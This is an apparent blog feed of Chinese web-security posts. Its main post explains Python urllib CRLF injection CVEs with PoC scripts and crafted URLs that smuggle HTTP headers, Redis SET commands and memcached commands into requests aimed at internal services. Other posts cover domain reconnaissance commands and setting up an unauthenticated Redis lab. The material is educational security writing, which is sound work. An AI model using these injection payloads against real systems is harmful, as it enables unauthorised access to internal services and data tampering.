httpsX-nr-external-service: 1HTTP/1.1 403 ForbiddenForbidden</span><br></pre></td></tr></table></figure><h2 id="0x07-防御方法"><a href="#0x07-防御方法" class="headerlink" title="0x07 防御方法"></a>0x07 防御方法</h2><ul><li>使用HTTP2.0协议，其本身会对请求进行隔离，不存在HRS问题；</li><li>禁止前端服务器与后端服务器之间的TCP连接重用，保证不同用户不会复用同一个TCP连接；</li><li>前后端使用相同的服务器；</li><li>后端服务器需要对所有的请求字段做严格的校验，尤其是需要对备注类的头字段；</li><li>后端服务器需要针对敏感页面开启CSP；</li></ul>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Web安全基础" scheme="https://www.mi1k7ea.com/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="HRS" scheme="https://www.mi1k7ea.com/tags/HRS/"/>
    
  </entry>
  
  <entry>
    <title>Python urllib CRLF注入漏洞小结</title>
    <link href="https://www.mi1k7ea.com/2020/03/09/Python-urllib-CRLF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/"/>
    <id>https://www.mi1k7ea.com/2020/03/09/Python-urllib-CRLF注入漏洞小结/</id>
    <published>2020-03-09T15:05:41.000Z</published>
    <updated>2020-03-10T16:40:10.344Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>Python urllib CRLF注入漏洞是很早的东西了，但是19年又新爆出两个CVE，这里就比较下这几个CVE利用注意点及区别吧。</p><h2 id="0x01-CRLF注入漏洞"><a href="#0x01-CRLF注入漏洞" class="headerlink" title="0x01 CRLF注入漏洞"></a>0x01 CRLF注入漏洞</h2><p>CRLF是“回车 + 换行”（\r\n）的简称，十六进制，码为0x0d和0x0a。在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP内容并显示出来。因此，当我们能够控制HTTP消息头中的字符，注入一些恶意的换行比如一些会话Cookie或者HTML代码，这就是CRLF注入。</p><p>具体的可看到wooyun之前的文章：<a href="https://wooyun.js.org/drops/CRLF%20Injection%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90.html" target="_blank" rel="noopener">https://wooyun.js.org/drops/CRLF%20Injection%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90.html</a></p><h2 id="0x02-CVE-2016-5699"><a href="#0x02-CVE-2016-5699" class="headerlink" title="0x02 CVE-2016-5699"></a>0x02 CVE-2016-5699</h2><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>urllib2 and urllib in CPython (aka Python) before 2.7.10 and 3.x before 3.4.4</p><h3 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h3><p>正常访问URL：</p><p><code>http://10.10.10.10:8080</code></p><p>CRLF注入，注入点在IP地址和端口号的分隔符即<code>:</code>前面：</p><p><code>http://10.10.10.10\r\nx-injected: header\r\ntest:8080</code></p><h3 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h3><p>这部分直接引自参考的文章。</p><p>HTTP协议解析host的时候可以接受百分号编码的值，解码，然后包含在HTTP数据流里面，但是没有进一步的验证或者编码，这就可以注入一个换行符。</p><p>漏洞验证代码如下，fetch3.py：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> urllib.error</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line">url = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    info = urllib.request.urlopen(url).info()</span><br><span class="line">    print(info)</span><br><span class="line"><span class="keyword">except</span> urllib.error.URLError <span class="keyword">as</span> e:</span><br><span class="line">    print(e)</span><br></pre></td></tr></table></figure><p>本地开启nc监听端口：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p 12345</span><br></pre></td></tr></table></figure><p>接着，正常运行访问：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./fetch3.py http://127.0.0.1:12345/foo</span><br></pre></td></tr></table></figure><p>在nc中会接收到如下报文：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET /foo HTTP/1.1</span><br><span class="line">Accept-Encoding: identity</span><br><span class="line">User-Agent: Python-urllib/3.4</span><br><span class="line">Connection: close</span><br><span class="line">Host: 127.0.0.1:12345</span><br></pre></td></tr></table></figure><p>现在，我们在IP地址和端口之间的分隔符即<code>:</code>之前进行CRLF注入，尝试注入两个HTTP头字段：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./fetch3.py http://127.0.0.1%0d%0aX-injected:%20header%0d%0ax-leftover:%20:12345/foo</span><br></pre></td></tr></table></figure><p>然后在nc中接收到如下报文：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET /foo HTTP/1.1</span><br><span class="line">Accept-Encoding: identity</span><br><span class="line">User-Agent: Python-urllib/3.4</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">X-injected: header</span><br><span class="line">x-leftover: :12345</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>可以看到，请求是正常发送的，并且在Host头字段处获取主机IP地址时成功进行了CRLF注入，即将X-injected和x-leftover这两个头字段都注入了进去。至此，攻击者就可以注入任意的HTTP头字段了。</p><p>另外，在针对的是域名而非IP地址的场景进行利用的时候有个注意点，就是在域名后进行CRLF注入之前要插入一个空字符如<code>%00</code>，这样才能顺利地进行DNS查询。</p><p>比如下面的CRLF注入会URL解析失败：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost%0d%0ax-bar:%20:12345/foo</span><br></pre></td></tr></table></figure><p>但是下面的URL是可以正常解析并访问到127.0.0.1的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost%00%0d%0ax-bar:%20:12345/foo</span><br></pre></td></tr></table></figure><h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p>参考这篇文章即可：<a href="https://www.cdxy.me/?p=660" target="_blank" rel="noopener">[CVE-2016-5699] Python HTTP header injection in urllib/urllib2</a></p><h2 id="0x03-CVE-2019-9740"><a href="#0x03-CVE-2019-9740" class="headerlink" title="0x03 CVE-2019-9740"></a>0x03 CVE-2019-9740</h2><h3 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h3><p>urllib2 in Python 2.x through 2.7.16 and urllib in Python 3.x through 3.7.3</p><h3 id="特征-1"><a href="#特征-1" class="headerlink" title="特征"></a>特征</h3><p>正常访问URL：</p><p><code>http://10.10.10.10:8080/test/?test=a</code></p><p>CRLF注入，注入点在IP地址和端口号的分隔符即<code>:</code>前面，但是和前者的区别在于注入新的端口：</p><p><code>http://10.10.10.10:1234?a=1 HTTP/1.1\r\nX-injected: header\r\nTEST: 123:8080/test/?test=a</code></p><h3 id="PoC-1"><a href="#PoC-1" class="headerlink" title="PoC"></a>PoC</h3><p>官网的PoC：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> urllib.error</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line">host = <span class="string">"192.168.10.137:7777?a=1 HTTP/1.1\r\nX-injected: header\r\nTEST: 123"</span></span><br><span class="line">url = <span class="string">"http://"</span> + host + <span class="string">":8080/test/?test=a"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    info = urllib.request.urlopen(url).info()</span><br><span class="line">    print(info)</span><br><span class="line"><span class="keyword">except</span> urllib.error.URLError <span class="keyword">as</span> e:</span><br><span class="line">    print(e)</span><br></pre></td></tr></table></figure><p>在Kali开启nc监听7777端口：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 7777</span><br></pre></td></tr></table></figure><p>然后运行PoC脚本后，在Kali端接收到请求，可以看到请求报文中是成功CRLF注入了HTTP头字段的：</p><p><img src="/2020/03/09/Python-urllib-CRLF注入漏洞小结/1.png" alt=""></p><p>接着，我们试下攻击Redis，修改PoC脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> urllib.error</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line">host = <span class="string">"192.168.10.137:6379?\r\nSET hacker mi1k7ea\r\n"</span></span><br><span class="line">url = <span class="string">"http://"</span> + host + <span class="string">":8080/test/?test=a"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    info = urllib.request.urlopen(url).info()</span><br><span class="line">    print(info)</span><br><span class="line"><span class="keyword">except</span> urllib.error.URLError <span class="keyword">as</span> e:</span><br><span class="line">    print(e)</span><br></pre></td></tr></table></figure><p>运行脚本，显示报错：</p><p><img src="/2020/03/09/Python-urllib-CRLF注入漏洞小结/2.png" alt=""></p><p>虽然报错，但是在Kali中的Redis中成功创建了新的键值数据，也就是说成功通过Python urllib CRLF注入实现攻击Redis：</p><p><img src="/2020/03/09/Python-urllib-CRLF注入漏洞小结/3.png" alt=""></p><h3 id="源码分析-1"><a href="#源码分析-1" class="headerlink" title="源码分析"></a>源码分析</h3><p>参考这篇文章即可：<a href="https://xz.aliyun.com/t/5123" target="_blank" rel="noopener">CVE-2019-9740 Python urllib CRLF injection vulnerability 浅析</a></p><h2 id="0x04-CVE-2019-9947"><a href="#0x04-CVE-2019-9947" class="headerlink" title="0x04 CVE-2019-9947"></a>0x04 CVE-2019-9947</h2><h3 id="影响版本-2"><a href="#影响版本-2" class="headerlink" title="影响版本"></a>影响版本</h3><p>urllib2 in Python 2.x through 2.7.16 and urllib in Python 3.x through 3.7.3</p><h3 id="特征-2"><a href="#特征-2" class="headerlink" title="特征"></a>特征</h3><p>正常访问URL：</p><p><code>http://10.10.10.10:8080</code></p><p>CRLF注入，注入点在端口号后面：</p><p><code>http://10.10.10.10:8080/?q=HTTP/1.1\r\nHeader: Value\r\nHeader2: \r\n</code></p><p><code>http://10.10.10.10:8080/HTTP/1.1\r\nHeader: Value\r\nHeader2: \r\n</code></p><h3 id="PoC-2"><a href="#PoC-2" class="headerlink" title="PoC"></a>PoC</h3><p>官网的PoC：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line">urllib.request.urlopen(<span class="string">'http://192.168.10.137:7777/?q=HTTP/1.1\r\nHeader: Value\r\nHeader2: \r\n'</span>)</span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line"><span class="comment">#urllib.request.urlopen('http://192.168.10.137:7777/HTTP/1.1\r\nHeader: Value\r\nHeader2: \r\n')</span></span><br></pre></td></tr></table></figure><p>在Kali开启nc监听7777端口：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 7777</span><br></pre></td></tr></table></figure><p>然后运行PoC脚本后，在Kali端接收到请求，可以看到两种形式的请求报文中都是成功CRLF注入了HTTP头字段的：</p><p><img src="/2020/03/09/Python-urllib-CRLF注入漏洞小结/4.png" alt=""></p><p><img src="/2020/03/09/Python-urllib-CRLF注入漏洞小结/5.png" alt=""></p><p>接着修改下PoC脚本来打内网Redis：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line">urllib.request.urlopen(<span class="string">'http://192.168.10.137:6379/?q=HTTP/1.1\r\nSET VULN POC\r\nHeader2:\r\n'</span>)</span><br></pre></td></tr></table></figure><p>运行之后虽然报错，但在Kali的Redis中成功创建了新的键值数据，也就是说成功通过Python urllib CRLF注入实现攻击Redis：</p><p><img src="/2020/03/09/Python-urllib-CRLF注入漏洞小结/6.png" alt=""></p><h2 id="0x05-漏洞组合拳"><a href="#0x05-漏洞组合拳" class="headerlink" title="0x05 漏洞组合拳"></a>0x05 漏洞组合拳</h2><h3 id="Http-Request-Smuggling"><a href="#Http-Request-Smuggling" class="headerlink" title="Http Request Smuggling"></a>Http Request Smuggling</h3><p>HRS即HTTP请求走私，在2005年的时候已被提出，只是最近圈内比较重视敏感信息泄露这块才被重新关注，可参考：</p><p>比如原始请求如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET /foo HTTP/1.1</span><br><span class="line">Accept-Encoding: identity</span><br><span class="line">User-Agent: Python-urllib/3.4</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>根据HRS，攻击者可以追加注入一个完整的HTTP请求头：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1%0d%0aConnection%3a%20Keep-Alive%0d%0a%0d%0aPOST%20%2fbar%20HTTP%2f1.1%0d%0aHost%3a%20127.0.0.1%0d%0aContent-Length%3a%2031%0d%0a%0d%0a%7b%22new%22%3a%22json%22%2c%22content%22%3a%22here%22%7d%0d%0a:12345/foo</span><br></pre></td></tr></table></figure><p>此时请求包内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">GET /foo HTTP/1.1</span><br><span class="line">Accept-Encoding: identity</span><br><span class="line">User-Agent: Python-urllib/3.4</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line"></span><br><span class="line">POST /bar HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Length: 31</span><br><span class="line"></span><br><span class="line">&#123;&quot;new&quot;:&quot;json&quot;,&quot;content&quot;:&quot;here&quot;&#125;</span><br><span class="line">:12345</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>该请求在Apache HTTPD下是能成功利用的，但在其他的Web容器中就不一定能正确地解析利用了，这是需要前端服务和后端服务解析的二义性才能导致HRS攻击成功。</p><p>这种攻击可以用在内网攻击上，比如无认证的Rest接口等。</p><h3 id="Redis未授权访问漏洞"><a href="#Redis未授权访问漏洞" class="headerlink" title="Redis未授权访问漏洞"></a>Redis未授权访问漏洞</h3><p>如果Redis在本地未设置密码验证即存在未授权访问漏洞，那么攻击者可以组合Python urllib CRLF注入漏洞来攻击利用Redis未授权访问漏洞，通过其备份文件的功能实现写WebShell、SSH公钥和定时任务反弹shell等等。</p><p>参考：<a href="https://security.tencent.com/index.php/blog/msg/106" target="_blank" rel="noopener">Hack Redis via Python urllib HTTP Header Injection</a></p><h3 id="Memcached未授权访问漏洞"><a href="#Memcached未授权访问漏洞" class="headerlink" title="Memcached未授权访问漏洞"></a>Memcached未授权访问漏洞</h3><p>Memcached是一套常用的key-value缓存系统，由于它本身没有权限控制模块，即使没有对外开放端口，但攻击者还是可以组合Python urllib CRLF注入漏洞来通过命令交互来直接读入Memcached中的敏感信息。</p><p>如果我们可以控制内网的Python访问一个URL，然后我们就可以轻松的访问memcached了，比如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1%0d%0aset%20foo%200%200%205%0d%0aABCDE%0d%0a:11211/foo</span><br></pre></td></tr></table></figure><p>就会产生下面的HTTP头</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /foo HTTP/1.1</span><br><span class="line">Accept-Encoding: identity</span><br><span class="line">Connection: close</span><br><span class="line">User-Agent: Python-urllib/3.4</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">set foo 0 0 5</span><br><span class="line">ABCDE</span><br><span class="line">:11211</span><br></pre></td></tr></table></figure><p>当检查下面几行memcached的协议语法的时候，大部分都是语法错误，但是memcached在收到错误的命令的时候并不会关闭连接，这样攻击者就可以在请求的任何位置注入命令了，然后memcached就会执行。下面是memcached的响应（memcached是Debian下包管理默认配置安装的）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ERROR</span><br><span class="line">ERROR</span><br><span class="line">ERROR</span><br><span class="line">ERROR</span><br><span class="line">ERROR</span><br><span class="line">STORED</span><br><span class="line">ERROR</span><br><span class="line">ERROR</span><br></pre></td></tr></table></figure><p>经过确认，memcached中确实成功的插入了<code>foo</code>的值。这种场景下，攻击者就可以给内网的memcached实例发送任意命令了。如果应用依赖于memcached中存储的数据（比如用户的session数据，HTML或者其他的敏感数据），攻击者可能获取应用更高的权限了。这个利用方式还可以造成拒绝服务攻击，就是攻击者可以在memcached中存储大量的数据。</p><h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><p><a href="https://xz.aliyun.com/t/5123" target="_blank" rel="noopener">CVE-2019-9740 Python urllib CRLF injection vulnerability 浅析</a></p><p><a href="http://pages.strcpy.me/index.php/archives/749/" target="_blank" rel="noopener">Python urllib HTTP头注入漏洞</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Python" scheme="https://www.mi1k7ea.com/categories/Python/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Python" scheme="https://www.mi1k7ea.com/tags/Python/"/>
    
      <category term="CRLF注入" scheme="https://www.mi1k7ea.com/tags/CRLF%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>内网信息收集之域相关信息收集</title>
    <link href="https://www.mi1k7ea.com/2020/03/08/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8B%E5%9F%9F%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>https://www.mi1k7ea.com/2020/03/08/内网信息收集之域相关信息收集/</id>
    <published>2020-03-08T09:23:51.000Z</published>
    <updated>2020-03-08T14:14:43.448Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-参考"><a href="#0x00-参考" class="headerlink" title="0x00 参考"></a>0x00 参考</h2><p>《内网安全攻防》笔记。</p><h2 id="0x01-判断是否存在域"><a href="#0x01-判断是否存在域" class="headerlink" title="0x01 判断是否存在域"></a>0x01 判断是否存在域</h2><p>获得本机相关信息之后，就要判断当前内网中是否存在域。如果当前内网存在域，则需要判断所控主机是否在域内。</p><h3 id="ipconfig命令"><a href="#ipconfig命令" class="headerlink" title="ipconfig命令"></a>ipconfig命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure><p>使用该命令即可查看网管IP、DNS IP、域名、本机是否和DNS服务器出于同一网段等信息。</p><p><img src="/2020/03/08/内网信息收集之域相关信息收集/1.png" alt=""></p><p>然后就可以通过反向解析命令nslookup来解析域名的IP地址，用解析得到的IP地址进行对比，判断DC和DNS服务是否在同一台服务器上。</p><p><img src="/2020/03/08/内网信息收集之域相关信息收集/2.png" alt=""></p><h3 id="查看系统详细信息"><a href="#查看系统详细信息" class="headerlink" title="查看系统详细信息"></a>查看系统详细信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure><p>显示项的“域”即域名，“登录服务器”即域控制器。若“域”为“WORKGROUP”则表示当前机器不在域内。</p><p><img src="/2020/03/08/内网信息收集之域相关信息收集/3.png" alt=""></p><h3 id="查询当前登录域及登录用户信息"><a href="#查询当前登录域及登录用户信息" class="headerlink" title="查询当前登录域及登录用户信息"></a>查询当前登录域及登录用户信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net config workstation</span><br></pre></td></tr></table></figure><p>显示项的“工作站域 DNS 名称”即域名（若为“WORKGROUP”则表示不在域中），“登录域”用于表示当前登录的用户是域用户还是本地用户。</p><p><img src="/2020/03/08/内网信息收集之域相关信息收集/4.png" alt=""></p><h3 id="判断主域"><a href="#判断主域" class="headerlink" title="判断主域"></a>判断主域</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net time /domain</span><br></pre></td></tr></table></figure><p>该命令用于判断主域（域服务器通常会同时作为时间服务器使用），执行后通常会有如下三种情况：</p><p>1、存在域，但当前用户不是域用户。</p><p><img src="/2020/03/08/内网信息收集之域相关信息收集/6.png" alt=""></p><p>2、存在域，且当前用户是域用户。</p><p><img src="/2020/03/08/内网信息收集之域相关信息收集/5.png" alt=""></p><p>3、当前网络环境为工作组，不存在域。</p><p><img src="/2020/03/08/内网信息收集之域相关信息收集/7.png" alt=""></p><h2 id="0x02-探测域内存活主机"><a href="#0x02-探测域内存活主机" class="headerlink" title="0x02 探测域内存活主机"></a>0x02 探测域内存活主机</h2><h3 id="利用NetBIOS探测内网"><a href="#利用NetBIOS探测内网" class="headerlink" title="利用NetBIOS探测内网"></a>利用NetBIOS探测内网</h3>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="内网渗透" scheme="https://www.mi1k7ea.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="渗透测试" scheme="https://www.mi1k7ea.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="内网渗透" scheme="https://www.mi1k7ea.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Redis安全小结</title>
    <link href="https://www.mi1k7ea.com/2020/03/05/Redis%E5%AE%89%E5%85%A8%E5%B0%8F%E7%BB%93/"/>
    <id>https://www.mi1k7ea.com/2020/03/05/Redis安全小结/</id>
    <published>2020-03-05T14:29:30.000Z</published>
    <updated>2020-03-10T14:48:19.302Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-Redis"><a href="#0x01-Redis" class="headerlink" title="0x01 Redis"></a>0x01 Redis</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>REmote DIctionary Server(Redis) 是一个由Salvatore Sanfilippo写的key-value存储系统。</p><p>Redis是一个开源的使用ANSI C语言编写、遵守BSD协议、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。</p><p>它通常被称为数据结构服务器，因为值（value）可以是 字符串(String), 哈希(Hash), 列表(list), 集合(sets) 和 有序集合(sorted sets)等类型。</p><p>Redis服务的默认端口是6379。</p><p>官网查看更多信息：<a href="https://redis.io/" target="_blank" rel="noopener">https://redis.io/</a></p><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><p>常见命令如下：</p><ul><li>查看信息：info</li><li>删除所有数据库内容：flushall</li><li>刷新数据库：flushdb</li><li>查看所有键：keys *，使用select num可以查看键值数据</li><li>设置变量：set aaa “mi1k7ea”</li><li>查看变量值：get aaa</li><li>查看备份文件路径：config get dir</li><li>设置备份文件路径：config set dir dirpath</li><li>查看备份文件名：config get dbfilename</li><li>设置备份文件名：config set dbfilename filename</li><li>保存备份文件：save</li></ul><h3 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h3><p>这里搭建漏洞版本的Redis服务，同时配置服务进行全网监听：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载并解压运行make</span></span><br><span class="line">wget http://download.redis.io/releases/redis-3.2.11.tar.gz</span><br><span class="line">tar zxf redis-3.2.11.tar.gz</span><br><span class="line"><span class="built_in">cd</span> redis-3.2.11/</span><br><span class="line">make</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进入src目录中将redis-server和redis-cli复制到/usr/bin目录下，方便命令识别</span></span><br><span class="line"><span class="built_in">cd</span> src</span><br><span class="line">cp redis-server /usr/bin/</span><br><span class="line">cp redis-cli /usr/bin/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将redis.conf复制到/etc/目录下</span></span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">cp redis.conf /etc/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 编辑/etc/中的redis配置文件redis.conf</span></span><br><span class="line">vim /etc/redis.conf</span><br><span class="line"><span class="comment">#注释掉本地绑定，允许除本地外的主机远程访问Redis服务</span></span><br><span class="line"><span class="comment">##bind 127.0.0.1</span></span><br><span class="line"><span class="comment">#关闭保护模式，允许远程连接Redis服务</span></span><br><span class="line"><span class="comment">#protected-mode no</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用/etc/目录下的redis.conf文件中的配置来启动Redis服务</span></span><br><span class="line">redis-server /etc/redis.conf</span><br></pre></td></tr></table></figure><p>接着在Windows下就能无需密码认证直接远程连接Redis了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.10.137 -p 6379</span><br></pre></td></tr></table></figure><h3 id="安全配置密码验证"><a href="#安全配置密码验证" class="headerlink" title="安全配置密码验证"></a>安全配置密码验证</h3><p>我们可以通过Redis的配置文件设置密码参数，这样客户端连接到Redis服务就需要密码验证，这样可以让你的Redis服务更安全，进而杜绝了未授权访问漏洞。</p><p>我们可以通过以下命令查看是否设置了密码验证：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; 